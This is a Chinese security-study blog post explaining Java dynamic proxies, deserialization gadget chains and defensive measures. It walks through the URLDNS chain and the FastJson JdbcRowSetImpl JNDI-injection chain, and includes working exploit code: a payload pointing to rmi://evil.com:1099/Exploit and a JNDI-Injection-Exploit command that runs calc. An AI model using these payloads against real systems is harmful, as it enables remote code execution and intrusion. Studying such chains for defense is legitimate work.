---
title: 第46天-Java安全学习笔记：动态代理与反序列化利用链深度解析
url: https://mp.weixin.qq.com/s/DjMcGQu7ZLEFfdZKQgn6EQ
source: Doonsec's feed
date: 2026-02-22
fetch_date: 2026-02-23T04:17:14.361976
---

# 第46天-Java安全学习笔记：动态代理与反序列化利用链深度解析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Byhdgj3e9qu6bxa2fO6RBSKfkCnz9tCU4lz95OaGZnpiaYX7ia1owwVoxHYvGHncvTOjQibJRqEgrMJtEzGCEd0vmib5u2dYFk1VHsfnajyFyps/0?wx_fmt=jpeg)

# 第46天-Java安全学习笔记：动态代理与反序列化利用链深度解析

原创

萧瑶
萧瑶

AlphaNet

![]()

在小说阅读器中沉浸阅读

在JavaEE Web开发中，动态代理和反序列化是两个核心机制，同时也是安全研究人员关注的重点。动态代理常被用于AOP、RPC等场景，而反序列化则广泛应用于数据持久化、网络通信和RMI。然而，这些强大的功能也带来了严重的安全隐患——攻击者可以通过精心构造的序列化数据触发恶意代码执行。本文将从基础概念出发，深入分析动态代理的原理、反序列化漏洞的成因，并剖析两条经典利用链：URLDNS链 和 FastJson JdbcRowSetImpl链。

---

一、动态代理机制

代理模式是Java中最常用的设计模式之一。代理类与委托类实现相同的接口，代理类负责为委托类预处理消息、过滤消息、转发消息以及事后处理等。Java支持两种代理：静态代理（手动编写代理类）和 动态代理（运行时动态生成代理类）。这里我们重点学习JDK自带的动态代理。

1.1 JDK动态代理的实现步骤

1. 创建接口及定义方法

```java

public interface UserService {

void addUser(String username);

}

```

2. 实现接口（真实对象）

```java

public class UserServiceImpl implements UserService {

@Override

public void addUser(String username) {

System.out.println("添加用户：" + username);

}

}

```

3. 实现InvocationHandler接口，重写invoke方法

invoke方法会在代理对象调用方法时被触发，我们可以在此处添加增强逻辑。

```java

import java.lang.reflect.InvocationHandler;

import java.lang.reflect.Method;

public class LogHandler implements InvocationHandler {

private Object target; // 真实对象

public LogHandler(Object target) {

this.target = target;

}

@Override

public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {

System.out.println("调用前，记录日志...");

Object result = method.invoke(target, args); // 调用真实对象的方法

System.out.println("调用后，记录日志...");

return result;

}

}

```

4. 创建代理对象并调用方法

使用java.lang.reflect.Proxy的newProxyInstance方法动态生成代理对象。

```java

import java.lang.reflect.Proxy;

public class Main {

public static void main(String[] args) {

UserService userService = new UserServiceImpl();

LogHandler handler = new LogHandler(userService);

// 创建代理对象

UserService proxy = (UserService) Proxy.newProxyInstance(

userService.getClass().getClassLoader(),

userService.getClass().getInterfaces(),

handler);

proxy.addUser("Alice");

}

}

```

1.2 动态代理的安全利用

在安全领域，动态代理常被用于构造利用链。攻击者会寻找某个类，其方法在反序列化过程中被调用，且该方法能通过代理触发恶意逻辑。例如，CC1链（Commons Collections 1） 中的LazyMap就是利用动态代理和AnnotationInvocationHandler实现任意代码执行。

利用条件分析：

· 存在一个InvocationHandler实现类，其invoke方法中包含危险操作（如调用Runtime.exec或触发JNDI注入）。

· 目标类的readObject方法中调用了某个Map的get或entrySet等方法，而这个Map被代理对象替换。

· 当反序列化触发该方法调用时，代理对象的invoke被执行，从而执行攻击者构造的恶意代码。

安全案例：ysoserial的CC1链 中LazyMap正是利用动态代理，结合AnnotationInvocationHandler在反序列化时调用entrySet，进而触发LazyMap.get，最终导致Transformer链执行。

---

二、反序列化基础

2.1 什么是序列化与反序列化？

· 序列化：将内存中的Java对象转换成字节流（二进制数据），以便存储或传输。

· 反序列化：将字节流重新转换成内存中的Java对象。

· 通俗理解：对象 ↔ 字节流的相互转换。

2.2 为什么需要序列化？

1. 数据持久化：将对象保存到文件、数据库等永久存储介质。

2. 网络通信：在不同进程之间传输对象，如Socket通信、RPC。

3. RMI（远程方法调用）：通过序列化传输对象参数和返回值。

2.3 常见的序列化/反序列化协议

· Java原生：writeObject() / readObject()

· XML：XMLDecoder / XMLEncoder

· JSON：FastJson、Jackson

· YAML：SnakeYaml

· 其他：XStream、Kryo、Hessian 等

---

三、反序列化安全问题

3.1 为什么会存在安全漏洞？

根本原因是：反序列化时，对象的readObject方法会被自动调用。如果某个类的readObject方法中包含了危险操作（如执行命令、读取文件、发起JNDI查询），且攻击者能控制序列化数据的内容，那么就可以触发恶意代码。

此外，还有一些隐式调用点，例如：

· 对象被输出时可能调用toString方法（如日志输出）。

· 集合类在反序列化时可能调用元素的hashCode、equals等方法。

· 构造函数、静态代码块在类加载时执行。

3.2 反序列化利用链（Gadget Chains）

一个完整的利用链通常由三部分组成：

1. 入口类（Source）：实现了Serializable接口，且重写了readObject方法，并在该方法中调用了某个可控对象的常见方法（如HashMap.readObject中调用hash(key)）。

2. 调用链（Gadget Chain）：一系列类和方法调用，最终到达危险执行点。要求这些类的方法签名相互匹配（同名、同参数类型）。

3. 执行类（Sink）：真正执行危险操作的地方，如Runtime.exec()、JNDI lookup、文件写入等。

3.3 反序列化利用条件

· 存在可控的输入变量，且程序对该输入进行了反序列化操作（如ObjectInputStream.readObject()）。

· 被反序列化的类必须实现Serializable或Externalizable接口。

· 攻击者能找到一条从readObject到危险方法的调用链（可能依赖第三方库）。

---

四、原生反序列化及URLDNS链分析

URLDNS链是ysoserial中一个经典的检测链，它不执行命令，只发起一次DNS查询，用于验证目标是否存在反序列化漏洞。其优点是纯JDK自带，不依赖第三方库。

4.1 利用链分析

入口类是java.util.HashMap，它实现了Serializable，并在readObject中调用了hash(key)方法。hash方法会调用key.hashCode()。我们让key成为一个java.net.URL对象，而URL的hashCode方法在特定条件下会调用handler.hashCode，进而触发URLStreamHandler.getHostAddress（发起DNS查询）。

完整调用链：

```

HashMap.readObject()

-> putVal()  // 实际是put方法在反序列化时被调用

-> hash(key)

-> key.hashCode()  // key是URL对象

-> URL.hashCode()

-> handler.hashCode()  // handler是URLStreamHandler

-> getHostAddress()  // 发起DNS请求

```

4.2 构造利用代码

我们需要创建一个HashMap，将URL对象作为key放入。但注意：URL的hashCode在默认情况下会被缓存，第一次计算后会缓存结果，后续不会再触发DNS。因此，我们需要通过反射修改URL的hashCode值为-1（表示未缓存），并在DNS请求发出后再恢复，以避免本地构造时提前触发。

```java

import java.io.\*;

import java.lang.reflect.Field;

import java.net.URL;

import java.util.HashMap;

public class URLDNS {

public static void main(String[] args) throws Exception {

// 待检测的URL

URL url = new URL("http://your-dns-log-domain.com");

// 通过反射修改URL的hashCode字段为-1，避免构造时触发

Field hashCodeField = URL.class.getDeclaredField("hashCode");

hashCodeField.setAccessible(true);

hashCodeField.set(url, -1);

// 创建HashMap，将URL作为key放入

HashMap<URL, Integer> map = new HashMap<>();

map.put(url, 0);

// 恢复hashCode值，防止后续使用缓存

hashCodeField.set(url, -1);

// 序列化

ByteArrayOutputStream baos = new ByteArrayOutputStream();

ObjectOutputStream oos = new ObjectOutputStream(baos);

oos.writeObject(map);

oos.close();

// 反序列化（触发DNS查询）

byte[] bytes = baos.toByteArray();

ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes));

ois.readObject();

}

}

```

当目标服务器反序列化这个HashMap时，会计算URL的hashCode，从而发起DNS请求，攻击者即可通过DNS日志确认漏洞存在。

---

五、FastJson反序列化及JdbcRowSetImpl链分析

FastJson是阿里开源的JSON处理库，广泛应用于Java Web开发。其1.2.24及之前版本存在高危反序列化漏洞，攻击者可利用JdbcRowSetImpl链实现JNDI注入，执行任意代码。

5.1 FastJson基础

常用方法：

· JSON.toJSONString(obj)：序列化对象为JSON字符串。

· JSON.parse(json)：反序列化为JSONObject或Java对象（根据@type指定）。

· JSON.parseObject(json, Class)：直接反序列化为指定类。

安全特性：

· parse方法在反序列化时会调用目标类的setter方法。

· parseObject方法同样会调用setter，且可能额外调用getter（取决于具体版本和配置）。

· 支持通过@type指定类名，从而实例化任意类。

5.2 JdbcRowSetImpl利用链

com.sun.rowset.JdbcRowSetImpl是JDK自带的一个类，实现了javax.sql.RowSet接口，用于数据库连接。它的关键点在于：

· 属性dataSourceName（数据源JNDI名称）可通过setDataSourceName设置。

· 属性autoCommit可通过setAutoCommit设置，而setAutoCommit方法内部会调用connect()。

· connect()方法中会执行Context.lookup(this.getDataSourceName())，即根据dataSourceName进行JNDI查找。

攻击者可以构造JSON，设置@type为com.sun.rowset.JdbcRowSetImpl，并赋值dataSourceName为恶意RMI/LDAP地址，同时设置autoCommit为true触发connect()调用，最终导致JNDI注入。

5.3 漏洞利用代码

```java

import com.alibaba.fastjson.JSON;

public class FastJsonJdbc {

public static void main(String[] args) {

// 开启JNDI远程加载（JDK 8u121+ 需设置系统属性）

System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");

String payload = "{\n" +

"    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +

"    \"dataSourceName\": \"rmi://evil.com:1099/Exploit\",\n" +

"    \"autoCommit\": true\n" +

"}";

// 触发漏洞

JSON.parse(payload);

}

}

```

流程解析：

1. JSON.parse解析JSON，创建JdbcRowSetImpl实例。

2. 调用setDataSourceName设置dataSourceName为rmi://evil.com:1099/Exploit。

3. 调用setAutoCommit(true)。

4. setAutoCommit内部调用connect()。

5. connect()执行new InitialContext().lookup(this.getDataSourceName())，即向远程RMI服务查找对象。

6. RMI服务返回恶意序列化数据，触发客户端反序列化，最终执行攻击者指定的命令（如启动计算器）。

5.4 生成恶意RMI服务

使用工具如JNDI-Injection-Exploit生成RMI服务：

```bash

java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc" -A "evil.com"

```

该工具会启动RMI/LDAP服务，返回一个包含恶意字节码的Reference对象，客户端反序列化后加载远程类执行calc命令。

---

六、总结与安全建议

6.1 动态代理与反序列化的关联

动态代理在反序列化利用链中常扮演“中转站”角色：通过代理对象劫持方法调用，将原本正常的方法调用转向攻击者控制的invoke方法，从而插入恶意逻辑。例如CC1链中，AnnotationInvocationHandler的invoke方法会调用memberValues.get(member)，而memberValues被替换为LazyMap，最终触发Transformer链。

6.2 防护措施

1. 避免反序列化不可信数据：对传入的序列化数据进行严格校验或签名。

2. 使用黑名单/白名单：在ObjectInputStream中重写resolveClass，禁止危险类反序列化。

3. 升级组件版本：及时修复已知漏洞，如FastJson 1.2.24升级到1.2.28+。

4. 禁用JNDI远程加载：设置com.sun.jndi.rmi.object.trustURLCodebase=false（JDK 8u121+默认已禁用）。

5. 使用安全工具：如Java自带的SerialKiller、ObjectInputStream过滤器（Java 9+支持）。

6.3 学习资源

· ysoserial项目：https://github.com/frohoff/ysoserial

· JNDI注入工具：https://github.com/welk1n/JNDI-Injection-Exploit

· 《Java安全漫谈》系列文章

---

通过本文，我们深入理解了Java动态代理的原理及其在安全利用中的作用，同时掌握了原生反序列化漏洞的成因、URLDNS检测链和FastJson JdbcRowSetImpl利用链的构造方法。希望这些知识能帮助你在Java安全研究或防御中更加得心应手。如果你对某个环节还有疑问，欢迎留言讨论！

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc...